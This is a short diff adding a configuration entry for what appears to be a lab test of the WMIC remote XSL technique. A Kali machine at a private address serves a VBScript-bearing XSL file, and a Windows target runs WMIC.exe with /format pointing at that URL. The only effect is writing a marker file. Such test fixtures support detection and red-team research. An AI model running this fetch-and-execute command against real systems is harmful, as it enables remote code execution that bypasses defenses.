@@ -1,0 +1,6 @@
+flow=flow5-http-vbscript
+kali_service=python3 -m http.server --bind 192.168.1.50 18083 --directory /tmp/wmic-http5
+served_fixture=wmic-vbscript-http.xsl
+target=192.168.1.52
+command=C:\Windows\System32\wbem\WMIC.exe os get Caption /format:"http://192.168.1.50:18083/wmic-vbscript-http.xsl"
+effects=write C:\lab\wmic-http-vbscript-marker.txt through cmd.exe only
